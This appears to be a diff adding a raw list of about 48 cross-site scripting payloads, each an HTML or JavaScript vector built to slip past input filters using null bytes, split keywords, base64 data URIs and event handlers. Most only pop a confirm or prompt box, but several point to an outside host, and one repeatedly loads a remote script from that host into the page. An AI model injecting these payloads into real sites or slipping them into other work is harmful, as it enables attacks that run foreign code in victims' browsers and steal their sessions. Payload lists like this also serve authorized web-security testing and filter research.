@@ -1,0 +1,48 @@
+<noscript><p title="</noscript><img src='greypwnd.pw/stored.php' onload=confirm()>">
+<noscript><p/title="</noscript><img/src='greypwnd.pw/stored.php'/onload=confirm()>">
+<img/src="x"/onerror=confirm()>
+<object/data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<img\x00src=x\x00onerror=prompt()//
+<sv%0ag/onload=confirm()//
+<svgonload=confirm(1)>
+<script x>prompt("pwnd")<script y>//
+<scrip%00t>open('javas'+'cript:ale'+'rt(1)');</scrip%00t>
+<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//greypwnd.pw:443/stored.php"},100);>#RCE
+<img/src="greypwnd.pw/stored.php"/onerror=confirm()>
+<html<svg/onload=confirm()//>
+<details/open/ontoggle=confirm('XSS')>
+<svg/onload=location='javas'+'cript:ale'+'()';// 
+<video/poster/onerror=prompt(1)>
+<input type="text" name="foo" value=""autofocus/onfocus=prompt(1)//">
+<h1/onmouseover='prompt()'>xss
+<plaintext/onmousemove=prompt()>xss
+<marquee/onstart=prompt()>xss
+<form onblur=prompt() tabindex=1 id=x></form><input autofocus>
+<frameset><frame/onload=cofirm()>
+<iframe id=x onfocus=prompt()>
+<img/src/onerror=confirm()>
+<div><li/id=x/tabindex=1/onactivate=confirm()></li></div>
+<div><nav/onclick="prompt()">1337</nav></div>
+<noframes/onmousemove="prompt()">1337</noframes>
+<noscript/onclick="ptompt()">1337</noscript>
+<object/onmouseleave="prompt()">1337</object>
+<span/onmouseup="confirm()">x</span>
+<table/onmousemove="confirm()">x</table>
+<time/onclick="prompt()">x</time>
+<body/onfocus=top.alert()>
+<body/onload=Function(prompt())()>
+<math><brute/href=javascript:prompt()>x
+%0a%0a<script>confirm()</script>.jsp
+<iframe/onreadystatechange=prompt()
+http://www.<script>prompt()</script .com
+<h1><IFRAME SRC=# onmouseover="prompt(1135)"></IFRAME>123</h1>
+<br size=\"&{prompt(1756)}\">
+<body/onmousemove="prompt()">x</body>
+<div/onmouseover='prompt(1)'>style="x:">
+<scriPt%00x>confirm()</scrIpt%00x>
+<details/open/ontoggle="confirm`1`">
+<video/poster/onerror=confirm()>
+<body/onload=confirm(/XSS/.source)>
+<svgonload=confirm()>
+<scr<script>ipt>confirm()</scr<script>ipt>
